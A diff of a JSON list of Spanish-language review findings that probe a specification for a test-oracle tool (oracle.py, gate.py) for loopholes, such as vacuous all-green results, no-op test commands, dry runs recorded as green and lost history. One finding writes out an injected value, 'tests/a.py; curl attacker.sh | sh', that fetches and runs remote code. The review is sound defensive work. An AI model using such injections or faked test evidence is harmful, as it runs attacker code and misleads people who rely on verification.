@@ -1,1 +1,32 @@
-[{"attack": "R-ORC-001 sólo exige exit 0 y `all_green: true` cuando «todos» los requisitos están verdes: en un change con cero requisitos la condición es vacíamente cierta, así que una implementación literal responde `all_green: true`, `counts.total: 0` y código `0` sin haber ejecutado un solo test, y el estado `verified` se concede sobre un oráculo que no verificó nada.", "requirement_id": "R-ORC-001", "severity": "high"}, {"attack": "Nada prohíbe combinar `--dry-run` (R-ORC-006: no se invoca el runner, código 0) con `--record` (R-ORC-007: DEBE añadir «la ejecución» al historial): `oracle.py --change X --dry-run --record` escribe en `oracle.json` un run en el que ningún test corrió, y como R-ORC-006 no fija qué estado llevan los requisitos en dry-run, ese run puede quedar registrado como verde y falsear la única traza que sostiene el veredicto del oráculo.", "requirement_id": "R-ORC-007", "severity": "high"}, {"attack": "R-ORC-002 pide marcar el rojo y «dejar los demás requisitos con el estado que les corresponda», sin exigir que se ejecuten: una implementación que aborta en el primer rojo y marca como `green` todos los requisitos aún no ejecutados pasa el escenario (los otros dos aparecen `green`) y publica en el JSON y en el historial requisitos verdes cuyo test nunca se invocó.", "requirement_id": "R-ORC-002", "severity": "medium"}, {"attack": "R-ORC-007 sólo pone cota superior («como mucho los últimos 50 runs») y el escenario sólo obliga a conservar dos: una implementación que trunca el historial a los 2 últimos runs cumple ambas cosas y destruye en cada ejecución el registro histórico acumulado, que es precisamente lo que este requisito dice acumular.", "requirement_id": "R-ORC-007", "severity": "medium"}]
+[
+  {
+    "attack": "Un change cuyo `delta/` no declara ningún requisito satisface el requisito de forma vacía: no hay ninguno en rojo, así que la implementación literal responde `all_green: true`, `counts.total: 0` y código `0`. El oráculo certifica como «todo verde» un change que no ha ejecutado ni un test, y ese run verde es exactamente la evidencia que `/venoxia:verify` y V17 usan para promover el change a `verified`.",
+    "requirement_id": "R-ORC-001",
+    "severity": "high"
+  },
+  {
+    "attack": "La única comprobación exigida sobre `test_command` es que contenga `{files}`, así que un proyecto con `test_command: \"true {files}\"` (o `echo {files}`) pasa la validación y devuelve código `0` para todos los requisitos: `all_green: true` sin haber ejecutado un solo test. Nada obliga al oráculo a verificar que la ruta de `verifies:` contenga realmente un test ni que ese test declare `@covers` del requisito, con lo que un fichero vacío también cuenta como verde y el change queda `verified` sin cobertura alguna.",
+    "requirement_id": "R-ORC-005",
+    "severity": "high"
+  },
+  {
+    "attack": "«El `test_command` ya sustituido por sus rutas de `verifies:`» y «pasarlas todas al mismo `test_command` en una sola invocación» se cumplen literalmente concatenando los valores de `verifies:` dentro de la cadena del comando y ejecutándola por shell, sin entrecomillado ni validación de la ruta. Un requisito con `verifies: tests/a.py; curl attacker.sh | sh` ejecuta código arbitrario en la máquina de quien corra `oracle.py` o `gate.py` sobre ese change (CI incluido), y basta con que el delta pase el validador para colarlo.",
+    "requirement_id": "R-ORC-008",
+    "severity": "high"
+  },
+  {
+    "attack": "«WHEN ese fichero ya existe pero su contenido no es JSON válido, sustituirlo por un historial nuevo avisando por stderr» se cumple truncando `oracle.json` y escribiendo un único run, sin copia previa. Cualquiera que añada un byte al fichero (o una escritura interrumpida) borra de forma irreversible todo el historial de verificación, incluido el run rojo previo que el ciclo exige como prueba de que el test falló antes del código; el aviso es una línea de stderr que en CI nadie lee.",
+    "requirement_id": "R-ORC-007",
+    "severity": "high"
+  },
+  {
+    "attack": "Nada prohíbe combinar `--dry-run` con `--record`: la implementación literal no invoca al runner (R-ORC-006) y a la vez añade la ejecución al historial (R-ORC-007), quedando en `oracle.json` un run sin un solo test ejecutado y sin ningún resultado rojo, es decir indistinguible de un verde legítimo para el auditor que sólo lee el disco. Es una forma trivial de fabricar la evidencia que promueve un change a `verified`.",
+    "requirement_id": "R-ORC-006",
+    "severity": "high"
+  },
+  {
+    "attack": "El corte de tiempo sólo existe «más allá de `--timeout`»: si no se pasa la opción, la implementación literal no está obligada a aplicar ningún límite y un test que se cuelga deja al oráculo (y a `gate.py`, que lo invoca por cada change) bloqueado indefinidamente. Tampoco hay cota agregada: con el timeout por requisito, un change de N requisitos puede tardar N × timeout sin que nada lo impida.",
+    "requirement_id": "R-ORC-004",
+    "severity": "medium"
+  }
+]
